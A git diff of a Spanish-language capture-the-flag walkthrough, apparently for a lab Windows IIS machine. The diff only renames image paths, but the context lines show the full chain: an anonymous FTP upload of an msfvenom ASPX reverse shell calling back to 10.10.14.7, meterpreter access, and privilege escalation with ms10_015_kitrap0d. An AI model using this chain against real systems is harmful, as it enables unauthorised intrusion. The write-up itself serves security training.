@@ -43,11 +43,11 @@ sudo nmap -sCV -p21,80 -v 10.10.10.5
 
 para que nos proporcione más información sobre esos puertos específicamente.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Revisamos el puerto 80.
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Es un **Microsoft IIS**. Como tenemos el puerto 21 con el usuario Anonymous podemos subir un archivo **.aspx** y hacer una Reverse Shell.
 
@@ -59,7 +59,7 @@ Creamos el archivo malicioso.
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f aspx -o shell.aspx
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Lo subimos a través de FTP.
 
@@ -67,7 +67,7 @@ Lo subimos a través de FTP.
 ftp 10.10.10.5
 ```
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Ejecutamos mediante la URL y conseguimos la conexión con **meterpreter**.
 
@@ -75,7 +75,7 @@ Ejecutamos mediante la URL y conseguimos la conexión con **meterpreter**.
 shell
 ```
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Se accede al directorio `C:\Windows\TEMP` para operar en un área temporal segura.
 
@@ -101,7 +101,7 @@ msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
 msf6 post(multi/recon/local_exploit_suggester) > run
 ```
 
-<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nos llama la atención el exploit `exploit/windows/local/ms10_015_kitrap0d.`
 
@@ -112,7 +112,7 @@ msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 2
 msf6 exploit(windows/local/ms10_015_kitrap0d) > run
 ```
 
-<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 🔐 **PRIVILEGIOS**
 
@@ -126,4 +126,4 @@ whoami
 
 Ya somos **root**.
 
-<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
